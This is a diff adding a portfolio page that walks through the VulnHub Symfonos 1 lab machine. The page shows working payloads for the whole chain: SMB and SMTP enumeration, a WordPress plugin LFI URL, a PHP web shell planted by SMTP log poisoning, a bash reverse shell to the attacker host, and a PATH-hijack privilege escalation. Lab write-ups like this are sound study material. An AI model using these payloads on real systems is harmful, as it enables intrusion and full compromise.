@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <title>Symfonos 1 | Walkthrough</title>
+</head>
+<body>
+
+<nav class="navbar">
+    <a class="logo" href="/">ROOT ACCESS</a>
+    <ul class="nav-links">
+        <li><a href="/index.html">Home</a></li>
+        <li><a href="/index.html#about">About</a></li>
+        <li><a href="/index.html#resume">Resume</a></li>
+        <li><a href="/index.html#projects">Projects</a></li>
+        <li><a href="/walkthroughs.html">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+<main class="writeup-container">
+    <!-- HERO SECTION -->
+    <div class="writeup-hero">
+        <span class="difficulty-badge">OSCP-STYLE | MEDIUM</span>
+        <h1>Symfonos: 1</h1>
+        <p class="machine-meta">Linux VM · VulnHub · LFI → Log Poisoning → PATH Hijacking</p>
+        <div class="attack-summary">
+            <p>This walkthrough demonstrates a full penetration testing methodology: from initial enumeration and credential harvesting to exploiting a Local File Inclusion (LFI), gaining remote code execution via SMTP log poisoning, and finally escalating to root through a clever PATH hijacking vulnerability.</p>
+        </div>
+    </div>
+
+    <!-- EXECUTIVE ABSTRACT - The "Why You Should Care" -->
+    <div class="executive-abstract">
+        <h2>🎯 Executive Abstract</h2>
+        <p><strong>The Problem:</strong> Organizations often leave "low priority" services like SMB and SMTP misconfigured, assuming they pose no real threat. This machine proved otherwise.</p>
+        <p><strong>The Approach:</strong> Rather than forcing an attack through the obvious web server, I pivoted through seemingly unrelated services—SMB leaks, SMTP user enumeration, and a forgotten WordPress plugin—to build a complete attack chain.</p>
+        <p><strong>The Outcome:</strong> Full root compromise in under 90 minutes. What could have been dismissed as "just an internal VM" demonstrated how seemingly minor misconfigurations (anonymous SMB share, outdated plugin, relative PATH in SUID binary) create a cascading failure path.</p>
+        <p><strong>Business Value:</strong> This methodology—enumerate <em>everything</em>, trust <em>nothing</em>, think sideways—directly translates to real-world engagements. The time saved by not brute-forcing or running blind scans? Hours per assessment. The cost of a real breach prevented by catching these misconfigurations? Priceless.</p>
+        <p><strong>Key Lesson:</strong> The most elegant exploit chains don't use zero-days. They use <em>your own misconfigurations against you</em>.</p>
+    </div>
+
+    <!-- VISUAL TIMELINE -->
+    <div class="timeline">
+        <div class="step">1. Recon</div>
+        <div class="step">2. Enumerate</div>
+        <div class="step">3. Exploit</div>
+        <div class="step">4. Escalate</div>
+    </div>
+
+    <!-- PHASE 1: RECONNAISSANCE -->
+    <section class="phase">
+        <h2>🔍 Phase 1: Reconnaissance</h2>
+        <p>Initial <code>nmap</code> scan revealed critical services: SSH (22), SMTP (25), HTTP (80), and SMB (139/445). The presence of SMB and SMTP alongside a basic web server suggested a misconfiguration-based attack path rather than web application exploitation.</p>
+        
+        <pre><code>nmap -sC -sV -p- 192.168.56.108</code></pre>
+        
+        <div class="image-grid">
+            <div class="image-card">
+                <img src="../Imgs/symfonos1/nmap-scan.png" alt="Nmap scan results showing open ports 22,25,80,139,445">
+                <p>Figure 1: Nmap scan revealing SMB, SMTP, and HTTP services.</p>
+            </div>
+            <div class="image-card">
+                <img src="../Imgs/symfonos1/web-default.png" alt="Default Apache page on port 80">
+                <p>Figure 2: Initial web page — static image, no interactive content.</p>
+            </div>
+        </div>
+        
+        <p>Since the web server offered no obvious attack surface, focus shifted to SMB enumeration.</p>
+    </section>
+
+    <!-- PHASE 2: ENUMERATION -->
+    <section class="phase">
+        <h2>📁 Phase 2: Service Enumeration</h2>
+        
+        <h3>SMB Share Discovery</h3>
+        <pre><code>smbclient -L //192.168.56.108/</code></pre>
+        <p>The <code>anonymous</code> share was accessible without credentials. Inside, a file named <code>attention.txt</code> was found, revealing weak passwords (<code>epidioko, qwerty, baseball</code>) and referencing a user named <strong>Helios</strong>.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/smb-attention.png" alt="attention.txt contents showing weak passwords">
+            <p>Figure 3: SMB leak — password hints and user mention.</p>
+        </div>
+        
+        <h3>SMTP User Enumeration</h3>
+        <p>The SMTP <code>VRFY</code> command confirmed the user <code>helios</code> exists on the system, giving us a valid username to pair with our password candidates.</p>
+        <pre><code>telnet 192.168.56.108 25
+VRFY helios
+252 2.0.0 helios</code></pre>
+        
+        <h3>Credential Validation</h3>
+        <p>Using the password <code>baseball</code>, we gained authenticated SMB access to the <code>helios</code> share. A file <code>todo.txt</code> pointed to a hidden directory: <strong>/h3l105</strong>.</p>
+        
+        <div class="image-grid">
+            <div class="image-card"><img src="../Imgs/symfonos1/todo-txt.png" alt="todo.txt showing /h3l105 path"><p>Figure 4: Clue to WordPress location.</p></div>
+            <div class="image-card"><img src="../Imgs/symfonos1/wordpress-install.png" alt="WordPress default page at /h3l105"><p>Figure 5: WordPress 5.2.2 installation.</p></div>
+        </div>
+    </section>
+
+    <!-- PHASE 3: WORDPRESS & LFI DISCOVERY -->
+    <section class="phase">
+        <h2>📝 Phase 3: WordPress Enumeration & LFI</h2>
+        
+        <h3>WPScan Enumeration</h3>
+        <p>A <code>wpscan</code> against the WordPress installation revealed outdated plugins, including <strong>Site Editor 1.1.1</strong> (vulnerable to CVE-2018-7422 — Local File Inclusion).</p>
+        <pre><code>wpscan --url http://symfonos.local/h3l105 --enumerate p</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/wpscan-results.png" alt="WPScan output showing Site Editor plugin">
+            <p>Figure 6: WPScan identifying vulnerable Site Editor plugin.</p>
+        </div>
+        
+        <h3>Local File Inclusion (LFI) Verification</h3>
+        <p>The vulnerable endpoint allowed reading <code>/etc/passwd</code>, confirming LFI:</p>
+        <pre><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/lfi-passwd.png" alt="LFI showing /etc/passwd contents">
+            <p>Figure 7: LFI successfully reading /etc/passwd.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 4: RCE VIA SMTP LOG POISONING -->
+    <section class="phase">
+        <h2>⚡ Phase 4: Remote Code Execution</h2>
+        <p>With LFI confirmed, the next step was to achieve Remote Code Execution. The presence of SMTP (port 25) allowed us to inject PHP code into the mail log file <code>/var/mail/helios</code> and include it via LFI.</p>
+        
+        <h3>Injecting PHP Shell via Telnet (SMTP)</h3>
+        <pre><code>telnet symfonos.local 25
+mail from: test@test.test
+rcpt to: helios@symfonos.localdomain
+data
+&lt;?php system($_GET['c']); ?&gt;
+.
+quit</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/smtp-injection.png" alt="SMTP telnet session injecting PHP code">
+            <p>Figure 8: SMTP log poisoning — injecting PHP code into mail spool.</p>
+        </div>
+        
+        <h3>Executing Commands via LFI</h3>
+        <p>Including the poisoned log file allowed command execution:</p>
+        <pre><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&c=id</code></pre>
+        <p><strong>Output:</strong> <code>uid=1000(helios) gid=1000(helios)</code> → RCE confirmed.</p>
+        
+        <h3>Reverse Shell</h3>
+        <p>A Netcat listener was started, and a bash reverse shell payload was URL-encoded and executed through the LFI endpoint:</p>
+        <pre><code>nc -nlvp 8888
+http://symfonos.local/...?ajax_path=/var/mail/helios&c=/bin/bash -c 'bash -i >%26 /dev/tcp/192.168.56.1/8888 0>%261'</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/reverse-shell.png" alt="Netcat catching reverse shell as helios">
+            <p>Figure 9: Successful reverse shell as user helios.</p>
+        </div>
+        
+        <h3>Shell Stabilization</h3>
+        <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+reset
+export TERM=xterm</code></pre>
+    </section>
+
+    <!-- PHASE 5: PRIVILEGE ESCALATION -->
+    <section class="phase">
+        <h2>👑 Phase 5: Privilege Escalation</h2>
+        <p>Running <code>sudo -l</code> showed no sudo rights, but a SUID binary caught attention: <code>/opt/statuscheck</code>.</p>
+        <pre><code>find / -perm -4000 2>/dev/null
+/opt/statuscheck</code></pre>
+        
+        <h3>Analyzing the SUID Binary</h3>
+        <p>Executing it printed <code>HTTP/1.1 200 OK</code>. Using <code>strings</code> revealed it calls <code>curl</code> without an absolute path — perfect for a PATH hijack.</p>
+        <pre><code>strings /opt/statuscheck
+curl -I http://localhost</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/statuscheck-strings.png" alt="strings output showing curl -I http://localhost">
+            <p>Figure 10: /opt/statuscheck calls curl with relative path.</p>
+        </div>
+        
+        <h3>PATH Hijack Exploit</h3>
+        <pre><code>echo 'chmod u+s /bin/bash' > /tmp/curl
+chmod +x /tmp/curl
+export PATH=/tmp:$PATH
+/opt/statuscheck</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/path-hijack.png" alt="Creating malicious curl and changing PATH">
+            <p>Figure 11: PATH hijack in action.</p>
+        </div>
+        
+        <h3>Root Shell Obtained</h3>
+        <pre><code>bash -p
+id
+uid=0(root) gid=1000(helios) euid=0(root)</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/root-shell.png" alt="Root shell obtained">
+            <p>Figure 12: Root access achieved.</p>
+        </div>
+    </section>
+
+    <!-- CONCLUSION -->
+    <section class="phase conclusion">
+        <h2>🏁 Conclusion & Key Takeaways</h2>
+        <ul>
+            <li><strong>Never trust default configurations:</strong> Anonymous SMB shares and outdated WordPress plugins led to the initial breach.</li>
+            <li><strong>Think sideways:</strong> SMTP log poisoning turned an LFI into full RCE.</li>
+            <li><strong>Privilege escalation is creative:</strong> PATH hijacking on a SUID binary is a common but often-missed vector.</li>
+            <li><strong>Methodology wins:</strong> Enumerate everything — services, files, hidden directories, and SUID binaries.</li>
+        </ul>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos1/root-flag.png" alt="Root flag captured">
+            <p>Figure 13: Final root flag confirmation.</p>
+        </div>
+        
+        <a href="../walkthroughs.html" class="btn-back">← Back to Walkthroughs</a>
+    </section>
+</main>
+
+<footer>
+    <p>© 2025 ROOT ACCESS | Built for offensive security professionals</p>
+</footer>
+
+</body>
+</html>
